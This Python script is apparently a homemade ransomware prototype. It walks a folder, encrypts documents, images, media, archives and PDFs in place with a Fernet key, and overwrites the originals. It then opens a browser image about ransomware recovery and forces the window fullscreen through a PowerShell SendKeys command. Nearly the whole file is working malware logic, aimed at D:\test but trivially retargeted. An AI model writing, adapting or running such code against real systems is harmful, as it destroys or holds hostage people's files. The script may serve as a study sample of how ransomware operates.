
# encyption/decryption module
from cryptography.fernet import Fernet

# module for finding files
import os

'''
# key generator
key = Fernet.generate_key()

# creating new file and storing the key
with open('mykey.key', 'wb') as mykey:
    mykey.write(key)

'''

# getting the key from the file
with open('mykey.key', 'rb') as mykey:
    key = mykey.read()
print("#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#")
print()
print("Encryption KEY")
print(key)
print("")
print("#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#")
print("Files that were found:")
print("")

# Getting work directory
thisdir = r'D:\test'

# r=root, d=directories, f=files
for r, d, f in os.walk(thisdir):
    for file in f:
        if file.endswith(".xlsx") or file.endswith(".txt") or file.endswith(".png") or file.endswith(".mp3") or file.endswith(".mp4") or file.endswith(".html") or file.endswith(".pdf") or file.endswith(".docx") or file.endswith(".zip"):
            print(os.path.join(r, file))

            ############### ENCRYPTION ###############
            # use the generated key
            f = Fernet(key)
            fileNameToString = os.path.join(r, file)

            # open the original file to encrypt
            with open(fileNameToString, 'rb') as original_file:
                original = original_file.read()
            # encrypt the file
            encrypted = f.encrypt(original)
            # you can write the encrypted data  file into a enc_sample.txt
            with open(fileNameToString, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)
            # and of course it will also delete the original files, so in case of someone wants to get access to them, must have a key :)

print()
print("All the found files have been successfully encrypted!")
os.system("start chrome https://securuscomms.co.uk/wp-content/uploads/2021/07/how-to-recover-from-a-ransomware-attack-image.jpg")
os.system("powershell -command Add-Type -AssemblyName System.Windows.Forms; $wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{F11}')")





